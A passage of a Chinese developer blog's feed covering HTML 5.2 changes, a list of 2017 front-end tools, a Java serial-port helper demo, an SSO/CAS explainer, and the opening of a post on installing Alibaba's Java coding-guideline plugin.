对表单中不同部分进行分组时，这个特性非常有用。在这种情况下使用标题元素是有意义的，因为这能让那些依赖于文档大纲的用户可以轻松导航至表单的对应部分。</p><h4 id="在HTML-5-2-中移除了一些元素，具体为："><a href="#在HTML-5-2-中移除了一些元素，具体为：" class="headerlink" title="在HTML 5.2 中移除了一些元素，具体为："></a>在HTML 5.2 中移除了一些元素，具体为：</h4><p>keygen：曾经用于帮助表单生成公钥<br>menu 与 menuitem：曾经用于创建导航与内容菜单</p><h4 id="在p中不再能包含行内、浮动、块类型的子元素"><a href="#在p中不再能包含行内、浮动、块类型的子元素" class="headerlink" title="在p中不再能包含行内、浮动、块类型的子元素"></a>在p中不再能包含行内、浮动、块类型的子元素</h4><p>在 HTML 5.2 中，p元素中唯一合法的子元素只能是文字内容。这也意味着以下类型的元素不再能嵌套于段落标签p 内：<br>行内块（Inline blocks）<br>行内表格（Inline tables）<br>浮动块与固定位置块</p><h4 id="不再支持严格文档类型（Strict-Doctypes）"><a href="#不再支持严格文档类型（Strict-Doctypes）" class="headerlink" title="不再支持严格文档类型（Strict Doctypes）"></a>不再支持严格文档类型（Strict Doctypes）</h4><p>最后，我们终于可以和这些文档类型说再见了！<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;</span>  </div><div class="line"></div><div class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;</span></div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;就在不到一个月前，HTML 5.2 正式成为了 W3C 的推荐标准（REC）。当一个规范到达 REC 阶段，就意味着它已经正式得到了 W3C 成员和理事长的认可。并且 W3C 将正式推荐浏览器厂商部署、web 开发者实现此规范。&lt;/p&gt;
&lt;p&gt;在 REC 阶段有个原则叫做“
      
    
    </summary>
    
      <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="HTML" scheme="http://yoursite.com/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>2017前端技术梳理</title>
    <link href="http://yoursite.com/2017/12/06/2017%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF%E6%A2%B3%E7%90%86/"/>
    <id>http://yoursite.com/2017/12/06/2017前端技术梳理/</id>
    <published>2017-12-06T13:16:06.000Z</published>
    <updated>2018-01-08T14:36:47.373Z</updated>
    
    <content type="html"><![CDATA[<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><p>JavaScript<br>CoffeeScript<br>TypeScript<br>Material design<br>WebAssembly</p><h3 id="前端标准-规范"><a href="#前端标准-规范" class="headerlink" title="前端标准/规范"></a>前端标准/规范</h3><p>HTTP/1.1<br>HTTP/2<br>HTTPS<br>W3C<br>ECMAScript<br>Commonjs<br>AMD (RequireJs)<br>CMD (Seajs)<br>UMD (UMD)<br>Yslow-23<br>OOCSS<br>SMACSS<br>BEM<br><a href="http://alloyteam.github.io/code-guide/" target="_blank" rel="external">Code Guide</a><br><a href="http://segmentfault.com/a/1190000000388784/" target="_blank" rel="external">编写可维护的CSS</a><br><a href="http://alloyteam.github.io/JX/doc/specification/google-javascript.xml" target="_blank" rel="external">GJS编码规范指南</a><br><a href="http://contribute.jquery.org/style-guide/js/" target="_blank" rel="external">jQuery规范</a></p><h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3><p>Sublime Text<br>webStorm<br>Atom<br>Vim<br>Emacs<br>Dreamweaver<br>Eclipse<br>WebStorm</p><h3 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h3><p>Developer Tools<br>Firebug<br>IETest<br>Chrome Dev Tools</p><h3 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h3><p>Git<br>SVN<br>GitHub<br>SourceForge<br><a href="http://mercurial.selenic.com/" target="_blank" rel="external">Mercurial(Hg)</a></p><h3 id="渲染引擎"><a href="#渲染引擎" class="headerlink" title="渲染引擎"></a>渲染引擎</h3><p>Trident = IE<br>Blink/prev.Webkit = Chrome<br>Gecko = Firefox<br>WebKit = Safari<br>Blink/Pre.Presto = Opera<br>EdgeHTML = Edge</p><h3 id="脚本引擎"><a href="#脚本引擎" class="headerlink" title="脚本引擎"></a>脚本引擎</h3><p>JScript = IE8-/Asp<br>Chakra = IE9/Edge<br>V8 = Chrome/Opera/Nodejs/MongoDb<br>SpoderMonkey = Firefox<br>Nitro = Safari</p><h3 id="库"><a href="#库" class="headerlink" title="库"></a>库</h3><p>JQuery<br>Backbone<br>JSDoc<br>Prototype<br>Zepto<br>Polymer<br>MooTool<br>Polyfill<br>Shim<br>Immutable<br>Lodash<br>RxJS</p><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p>Babel<br>React<br>Redux<br>Vue<br>VueX<br>Isomorphic JavaScript<br>Incremental DOM<br>Virtual Dom<br><a href="http://www.angularjs.org" target="_blank" rel="external">AngularJs</a><br><a href="http://backbonejs.org/" target="_blank" rel="external">Backbone</a><br><a href="http://ampersandjs.com/" target="_blank" rel="external">AmpersandJS</a><br><a href="http://knockoutjs.com/" target="_blank" rel="external">Knockout</a><br><a href="http://underscorejs.org/" target="_blank" rel="external">Underscore</a></p><h3 id="代码质量-质量控制"><a href="#代码质量-质量控制" class="headerlink" title="代码质量/质量控制"></a>代码质量/质量控制</h3><p>Qunit<br>Jasmine<br>UnitJs<br>Mocha<br>Should<br>Chai<br>Expect</p><h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p><a href="http://www.embeddedjs.com/" target="_blank" rel="external">EJS</a><br><a href="http://handlebarsjs.com/" target="_blank" rel="external">Handlebars</a><br><a href="http://jade-lang.com/" target="_blank" rel="external">Jade</a><br><a href="http://velocity.apache.org/" target="_blank" rel="external">Velocity</a></p><h3 id="布局框架"><a href="#布局框架" class="headerlink" title="布局框架"></a>布局框架</h3><p><a href="http://getbootstrap.com/" target="_blank" rel="external">Bootstrap</a><br><a href="http://foundation.zurb.com/" target="_blank" rel="external">Foundation</a><br><a href="http://www.getuikit.com/" target="_blank" rel="external">Uikit</a><br><a href="http://css-tricks.com/modular-future-web-components//" target="_blank" rel="external">Web Components</a></p><h3 id="构建工具及包管理器"><a href="#构建工具及包管理器" class="headerlink" title="构建工具及包管理器"></a>构建工具及包管理器</h3><p>Browserify<br>Gulp<br><a href="http://gruntjs.com/" target="_blank" rel="external">Grunt</a><br><a href="http://yeoman.io/" target="_blank" rel="external">Yeoman</a><br><a href="http://bower.io/" target="_blank" rel="external">Bower</a><br><a href="https://www.npmjs.org/" target="_blank" rel="external">NPM</a><br>Webpack<br>JSlint<br>JSHint<br>Jscs<br>Csslint<br>Postcss<br>Compression<br>Minification</p><h3 id="测试框架"><a href="#测试框架" class="headerlink" title="测试框架"></a>测试框架</h3><p><a href="http://pivotal.github.io/jasmine/" target="_blank" rel="external">Jasmine</a><br><a href="http://qunitjs.com/" target="_blank" rel="external">QUnit</a><br><a href="http://visionmedia.github.io/mocha/" target="_blank" rel="external">Mocha</a><br><a href="http://expressjs.com/" target="_blank" rel="external">Express</a></p><h3 id="CSS模块化"><a href="#CSS模块化" class="headerlink" title="CSS模块化"></a>CSS模块化</h3><p><a href="http://necolas.github.io/normalize.css/" target="_blank" rel="external">Normalize.css</a><br><a href="http://www.lesscss.net/" target="_blank" rel="external">LESS</a><br><a href="http://www.oocss.cc/ http://oocss.org/" target="_blank" rel="external">OOCSS</a><br><a href="http://www.cssreset.com/" target="_blank" rel="external">CssReset</a><br>Stylus</p><h3 id="CSS预处理器"><a href="#CSS预处理器" class="headerlink" title="CSS预处理器"></a>CSS预处理器</h3><p><a href="http://lesscss.org/" target="_blank" rel="external">Less</a><br><a href="http://sass-lang.com/" target="_blank" rel="external">Sass</a><br>Stylus</p><h3 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h3><p><a href="http://d3js.org/" target="_blank" rel="external">D3.js</a><br>ECharts<br>Processing<br>Recline.js<br>Dygraphs.js<br>InfoVis<br>The Google Visualization API<br>Springy.js<br>Polymaps.js<br>Dimple<br>Sigma.js<br>Raphael.js<br>Graphaël<br>Leaflet<br>Ember Charts<br><a href="http://kineticjs.com/" target="_blank" rel="external">KINETIC</a></p><h3 id="WebGL库"><a href="#WebGL库" class="headerlink" title="WebGL库"></a>WebGL库</h3><p>Three.js<br>Phaser.js<br>Pixi.js<br>Plotly.js<br>Two.js<br>Babylon.js<br>Deck.gl<br>Mapbox-gl-js</p><h3 id="模块加载器"><a href="#模块加载器" class="headerlink" title="模块加载器"></a>模块加载器</h3><p><a href="https://github.com/ecomfe/esl" target="_blank" rel="external">ESL</a><br><a href="http://requirejs.org/" target="_blank" rel="external">RequireJS</a><br><a href="http://seajs.org/docs/" target="_blank" rel="external">SeaJS</a></p><h3 id="调试工具-1"><a href="#调试工具-1" class="headerlink" title="调试工具"></a>调试工具</h3><p>Tern<br>Babel<br><a href="https://developers.google.com/chrome-developer-tools/" target="_blank" rel="external">Chrome</a><br><a href="https://getfirebug.com/" target="_blank" rel="external">Firebug</a><br><a href="http://www.httpwatch.com/" target="_blank" rel="external">HTTPWatch</a><br><a href="http://www.telerik.com/fiddler" target="_blank" rel="external">Fiddler</a><br>IE Developer Toolbar<br><a href="http://people.apache.org/~pmuellr/weinre/docs/latest/Home.html" target="_blank" rel="external">Weinre</a><br>ESLint</p><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p>Adsafe<br>Caja<br>Sandbox<br>同源策略<br>CSP 内容安全策略<br>白名单机制<br>CSRF<br>XSS 跨站请求伪造/跨站脚本攻击</p><h3 id="文档输出"><a href="#文档输出" class="headerlink" title="文档输出"></a>文档输出</h3><p>Dox<br>Doxmate<br>Grunt-doxmate</p><h3 id="压缩合并"><a href="#压缩合并" class="headerlink" title="压缩合并"></a>压缩合并</h3><p>CleanCss<br>UglifyJS<br>Google Clousure Complier<br>YUI Compressor</p><h3 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h3><p><a href="http://nodejs.org/" target="_blank" rel="external">Node</a><br><a href="http://httpd.apache.org/" target="_blank" rel="external">Apache</a><br><a href="http://nginx.org/" target="_blank" rel="external">Nginx</a></p><h3 id="性能监控"><a href="#性能监控" class="headerlink" title="性能监控"></a>性能监控</h3><p><a href="https://developers.google.com/speed/pagespeed/" target="_blank" rel="external">Google Page Speed</a><br><a href="https://developers.google.com/web-toolkit/speedtracer/?hl=zh-CN" target="_blank" rel="external">Google Speed Tracer  </a><br><a href="http://yslow.org/" target="_blank" rel="external">Yahoo Yslow </a><br><a href="http://fiddler2.com/" target="_blank" rel="external">Fiddler </a><br><a href="http://www.httpwatch.com/" target="_blank" rel="external">HttpWatch </a><br><a href="http://www.ieinspector.com/" target="_blank" rel="external">HTTP Analyzer</a></p><h3 id="服务器监控"><a href="#服务器监控" class="headerlink" title="服务器监控"></a>服务器监控</h3><p><a href="http://www.nagios.org/" target="_blank" rel="external">Nagios</a><br><a href="http://www.cacti.net/" target="_blank" rel="external">Cacti</a></p><h3 id="辅助应用"><a href="#辅助应用" class="headerlink" title="辅助应用"></a>辅助应用</h3><p>Fireworks<br>Paint.net<br>Photoshop<br>Paint.net<br>GIMP<br><a href="http://www.axure.com/" target="_blank" rel="external">Axure RP</a><br><a href="http://www.xmind.net/" target="_blank" rel="external">XMind</a></p><h3 id="社区-会议"><a href="#社区-会议" class="headerlink" title="社区/会议"></a>社区/会议</h3><p>w3c Tech<br>w3c Plus<br>w3 help<br>div.io<br>nedeParty<br>alloyteam<br>html5基地<br>segmentfault会议<br>深js<br>杭js<br>沪js<br>CMIC<br>D2<br>webrebuild<br>Qcon<br>velocity<br>CSSConf<br>HybridApp<br>html5 梦工厂</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;编程&quot;&gt;&lt;a href=&quot;#编程&quot; class=&quot;headerlink&quot; title=&quot;编程&quot;&gt;&lt;/a&gt;编程&lt;/h3&gt;&lt;p&gt;JavaScript&lt;br&gt;CoffeeScript&lt;br&gt;TypeScript&lt;br&gt;Material design&lt;br&gt;WebAsse
      
    
    </summary>
    
      <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="插件" scheme="http://yoursite.com/tags/%E6%8F%92%E4%BB%B6/"/>
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
      <category term="Css" scheme="http://yoursite.com/tags/Css/"/>
    
      <category term="html" scheme="http://yoursite.com/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>Java串口通信工具类</title>
    <link href="http://yoursite.com/2017/11/20/Java%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
    <id>http://yoursite.com/2017/11/20/Java串口通信工具类/</id>
    <published>2017-11-20T13:45:37.000Z</published>
    <updated>2017-11-27T13:49:08.396Z</updated>
    
    <content type="html"><![CDATA[<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><blockquote><p>Jar，Source，Doc包文件下载：<a href="http://pan.baidu.com/s/1nvwTpqT" target="_blank" rel="external">http://pan.baidu.com/s/1nvwTpqT</a><br>RXTX官网：<a href="http://rxtx.qbang.org/wiki/index.php/Using_RXTX" target="_blank" rel="external">http://rxtx.qbang.org/wiki/index.php/Using_RXTX</a></p></blockquote><h3 id="安装RXTX"><a href="#安装RXTX" class="headerlink" title="安装RXTX"></a>安装RXTX</h3><p>假设JDK路径如下:<br>c:\Program Files\Java\jre1.6.0_01\<br>复制 rxtxParallel.dll 到 c:\Program Files\Java\jre1.6.0_01\bin\<br>复制 rxtxSerial.dll 到 c:\Program Files\Java\jre1.6.0_01\bin\<br>复制 RXTXcomm.jar 到 c:\Program Files\Java\jre1.6.0_01\lib\ext\<br>注意: 如果在windows xp系统上安装还需要crtdll.dll，C运行时组件，自行去下载</p><h3 id="引入Jar包SerialPortHelper-1-0-jar"><a href="#引入Jar包SerialPortHelper-1-0-jar" class="headerlink" title="引入Jar包SerialPortHelper-1.0.jar"></a>引入Jar包SerialPortHelper-1.0.jar</h3><p>Maven:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xdemo.utils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>SerialPortHelper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></div></pre></td></tr></table></figure><h3 id="编写回调类"><a href="#编写回调类" class="headerlink" title="编写回调类"></a>编写回调类</h3><p>继承 AbstractReadCallback ，在call方法中，获取输入流输入的内容，用法如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> org.xdemo.utils.serial.demo;</div><div class="line"> </div><div class="line"><span class="keyword">import</span> gnu.io.SerialPortEvent;</div><div class="line"> </div><div class="line"><span class="keyword">import</span> java.io.BufferedReader;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.nio.charset.Charset;</div><div class="line"><span class="keyword">import</span> java.util.Timer;</div><div class="line"><span class="keyword">import</span> java.util.TimerTask;</div><div class="line"> </div><div class="line"><span class="keyword">import</span> org.xdemo.utils.serial.AbstractReadCallback;</div><div class="line"><span class="keyword">import</span> org.xdemo.utils.serial.SerialPortHelper;</div><div class="line"> </div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * DEMO，获取串口输出</span></div><div class="line"><span class="comment"> * <span class="doctag">@author</span> Goofy</span></div><div class="line"><span class="comment"> * <span class="doctag">@Date</span> 2017年6月20日 上午9:32:23</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyReadCallback</span> <span class="keyword">extends</span> <span class="title">AbstractReadCallback</span> </span>&#123;</div><div class="line"> </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">(BufferedReader reader, InputStream is)</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="comment">/**</span></div><div class="line"><span class="comment">               方式一：</span></div><div class="line"><span class="comment">               char[] buff=new char[1024];</span></div><div class="line"><span class="comment">                reader.read(buff);</span></div><div class="line"><span class="comment">                String c=new String(buff).trim();</span></div><div class="line"><span class="comment">                addResult(c);</span></div><div class="line"><span class="comment">              </span></div><div class="line"><span class="comment">               方式二：</span></div><div class="line"><span class="comment">               String result = reader.readLine();</span></div><div class="line"><span class="comment">                addResult(result.trim());</span></div><div class="line"><span class="comment">                </span></div><div class="line"><span class="comment">              </span></div><div class="line"><span class="comment">             */</span></div><div class="line">             </div><div class="line">            <span class="comment">//方式三 对于一些乱码的情况，需要进行字符集转换</span></div><div class="line">             </div><div class="line">            String result=reader.readLine();</div><div class="line">            result=<span class="keyword">new</span> String(result.getBytes(<span class="string">"GBK"</span>),<span class="string">"GBK"</span>);<span class="comment">//编码根据实际场景而定</span></div><div class="line">            addResult(result);</div><div class="line">             </div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">     </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onError</span><span class="params">(SerialPortEvent event)</span> </span>&#123;</div><div class="line">        System.out.println(<span class="string">"出错了,错误类型:\t"</span>+event.getEventType());</div><div class="line">    &#125;</div><div class="line"> </div><div class="line"> </div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        <span class="comment">//连续输出的，一般不需要发送命令，直接就是接受</span></div><div class="line">        <span class="keyword">final</span> SerialPortHelper sp=<span class="keyword">new</span> SerialPortHelper();</div><div class="line">        sp.open(<span class="string">"C:\\serial.config.properties"</span>);</div><div class="line">         </div><div class="line">        <span class="comment">//如果需要发送命令的</span></div><div class="line">        <span class="comment">//sp.write("P");</span></div><div class="line">         </div><div class="line">        <span class="comment">//如果需要不停的发送，可以使用#Timer,每隔1秒发送一次</span></div><div class="line">        <span class="keyword">new</span> Timer().schedule(<span class="keyword">new</span> TimerTask() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">                sp.write(<span class="string">"P"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;, <span class="number">0</span>, <span class="number">1000</span>);</div><div class="line">         </div><div class="line">        MyReadCallback callback=<span class="keyword">new</span> MyReadCallback();</div><div class="line">        sp.read(callback, Charset.forName(<span class="string">"UTF-8"</span>));</div><div class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)</div><div class="line">            System.out.println(callback.getResult());</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="配置文件，参考如下"><a href="#配置文件，参考如下" class="headerlink" title="配置文件，参考如下"></a>配置文件，参考如下</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#端口号</div><div class="line">PORT=COM5</div><div class="line">#波特率</div><div class="line">BAUD_RATE=9600</div><div class="line">#奇偶校验   NONE:0,ODD:1,EVEN:2,MARK:3,SPACE:4</div><div class="line">PARITY_BIT=0</div><div class="line">#数据位        5,6,7,8</div><div class="line">DATA_BIT=8</div><div class="line">#停止位        1:1,2:2,1.5:3</div><div class="line">STOP_BIT=1</div><div class="line">#字符编码</div><div class="line">CHARSET=UTF-8</div></pre></td></tr></table></figure><blockquote><p>转自：<a href="http://www.xdemo.org/java-serial-port/" target="_blank" rel="external">http://www.xdemo.org/java-serial-port/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Jar，Source，Doc包文件下载：&lt;a href=&quot;http://pan.baidu.com/s/1nvwT
      
    
    </summary>
    
      <category term="后端" scheme="http://yoursite.com/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>前端需要了解的 SSO 与 CAS 知识</title>
    <link href="http://yoursite.com/2017/11/09/%E5%89%8D%E7%AB%AF%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%20SSO%20%E4%B8%8E%20CAS%20%E7%9F%A5%E8%AF%86%20/"/>
    <id>http://yoursite.com/2017/11/09/前端需要了解的 SSO 与 CAS 知识 /</id>
    <published>2017-11-09T01:26:50.000Z</published>
    <updated>2018-01-16T16:51:33.232Z</updated>
    
    <content type="html"><![CDATA[<p>不管是什么公司，只要产品数量大于一个，那么单点登录势必是绕不过去的一个问题。作为前端程序员，我们对其虽然接触不多，但适当的了解还是必要的。本文就来谈谈单点登录相关的问题。<br>前置知识<br>了解 SSO，最好具备以下知识。当然，如果不是特别熟，也不影响阅读。</p><p>cookie及session<br>浏览器同源策略及跨域<br>了解登录系统的构成<br>什么是 SSO 与 CAS?</p><h3 id="SSO"><a href="#SSO" class="headerlink" title="SSO"></a>SSO</h3><p>SSO 是英文 Single Sign On 的缩写，翻译过来就是单点登录。顾名思义，它把两个及以上个产品中的用户登录逻辑抽离出来，达到只输入一次用户名密码，就能同时登录多个产品的效果。<br>使用 SSO 的优点很明显：<br>提升用户体验。就以我厂为例。我厂有两个产品，丁香人才网和丁香园论坛，假如你是我厂用户，肯定无法忍受登录丁香园论坛的时候输入一次用户名密码，登录人才网又要输入一次用户名密码吧？<br>避免重复开发。假如你是我厂后端，每天任务都饱和的不行，肯定无法忍受到人才网开发一套登录逻辑，到论坛又开发一套登录逻辑吧？<br>提升安全系数<br>假如你是我厂运维，发现了一个安全隐患需要紧急修复。你肯定无法忍受给茫茫多的产品后端都发一封邮件，责令修复吧？万一漏了一个呢？ </p><h3 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h3><p>SSO 仅仅是一种架构，一种设计，而 CAS 则是实现 SSO 的一种手段。两者是抽象与具体的关系。当然，除了 CAS 之外，实现 SSO 还有其他手段，比如简单的 cookie。CAS （Central Authentication Service）中心授权服务，本身是一个开源协议，分为 1.0 版本和 2.0 版本。1.0 称为基础模式，2.0称为代理模式，适用于存在非 Web 应用之间的单点登录。<br>同域 SSO如图，同域 SSO 是最简单的一种情况。此时，两个产品都是在一个域名下，单点登录是很自然的选择。我们来捋一捋步骤，搞清楚这里的步骤是理解后文的基础，千万不要跳过。<br>用户访问产品 a，向 后台服务器发送登录请求。<br>登录认证成功，服务器把用户的登录信息写入 session。<br>服务器为该用户生成一个 cookie，并加入到 response header 中，随着请求返回而写入浏览器。<br>该 cookie 的域设定为 dxy.cn。<br>下一次，当用户访问同域名的产品 b 时，由于 a 和 b 在同一域名下，也是 dxy.cn，浏览器会自动带上之前的 cookie。此时后台服务器就可以通过该 cookie 来验证登录状态了。<br>实际上，这种场景就是最简单最传统的登录操作。虽然我们把产品 a 和 b 人为分开了，但由于它们在同域上，就算看成是同一产品的不同类目也未尝不可。我们没有设置独立的 SSO 服务器，因为业务后台服务器本身就足以承担 SSO 的职能。<br>同父域 SSO<br>同父域 SSO 是同域 SSO 的简单升级，唯一的不同在于，服务器在返回 cookie 的时候，要把cookie 的 domain 设置为其父域。比如两个产品的地址分别为 a.dxy.cn 和 b.dxy.cn，那么 cookie 的域设置为 dxy.cn 即可。在访问 a 和 b 时，这个 cookie 都能发送到服务器，本质上和同域 SSO 没有区别。<br>.跨域 SSO<br>可以看到，在上面两种情况下，我们都没有专门设置 SSO 服务器。但是当两个产品不同域时，cookie 无法共享，所以我们必须设置独立的 SSO 服务器了。这个时候，我们就是通过标准的 CAS 方案来实现 SSO 的。<br>详解CAS</p><p>CAS 1.0 协议定义了一组术语，一组票据，一组接口。<br>术语：</p><p>Client：用户。<br>Server：中心服务器，也是 SSO 中负责单点登录的服务器。<br>Service：需要使用单点登录的各个服务，相当于上文中的产品 a/b。<br>/login：登录接口，用于登录到中心服务器。<br>/logout：登出接口，用于从中心服务器登出。<br>/validate：用于验证用户是否登录中心服务器。<br>/serviceValidate：用于让各个 service 验证用户是否登录中心服务器。 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不管是什么公司，只要产品数量大于一个，那么单点登录势必是绕不过去的一个问题。作为前端程序员，我们对其虽然接触不多，但适当的了解还是必要的。本文就来谈谈单点登录相关的问题。&lt;br&gt;前置知识&lt;br&gt;了解 SSO，最好具备以下知识。当然，如果不是特别熟，也不影响阅读。&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="其他" scheme="http://yoursite.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>阿里巴巴Java开发规约插件使用</title>
    <link href="http://yoursite.com/2017/11/03/%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4Java%E5%BC%80%E5%8F%91%E8%A7%84%E7%BA%A6%E6%8F%92%E4%BB%B6%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2017/11/03/阿里巴巴Java开发规约插件使用/</id>
    <published>2017-11-02T16:00:20.000Z</published>
    <updated>2017-11-12T11:27:56.818Z</updated>
    
    <content type="html"><![CDATA[<p>就在今天 10月14日上午9：00 阿里巴巴于在杭州云栖大会《研发效能峰会》上，正式发布《阿里巴巴Java开发手册》扫描插件，该插件在扫描代码后，将不符合《手册》的代码按Blocker/Critical/Major三个等级显示在下方，甚至在IDEA上，还基于Inspection机制提供了实时检测功能，编写代码的同时也能快速发现问题所在。对于历史代码，部分规则实现了批量一键修复的功能。–两个字牛逼</p><p>git地址为这里写链接内容 <a href="https://github.com/alibaba/p3c" target="_blank" rel="external">https://github.com/alibaba/p3c</a></p><h3 id="IDea的安装方式："><a href="#IDea的安装方式：" class="headerlink" title="IDea的安装方式："></a>IDea的安装方式：</h3><p>IDEA版的插件发布到了IDEA官方仓库中(最低支持版本14.1.7，JDK1.7+)，<br>只需打开<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Settings &gt;&gt; Plugins &gt;&gt; Browse repositories</div></pre></td></tr></table></figure></p><p>输入 Alibaba 搜索一下便可以看到对应插件了，点击安装等待安装完成。</p><p><img src="http://upload-images.jianshu.io/upload_images/2830896-cfd331e6143be5ec?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IDea"></p><h3 id="Eclipse的安装方式"><a href="#Eclipse的安装方式" class="headerlink" title="Eclipse的安装方式"></a>Eclipse的安装方式</h3><p>Eclipse版插件支持4.2（Juno，JDK1.8+）及以上版本，提供Update Site，通过</p><figure class="highlight 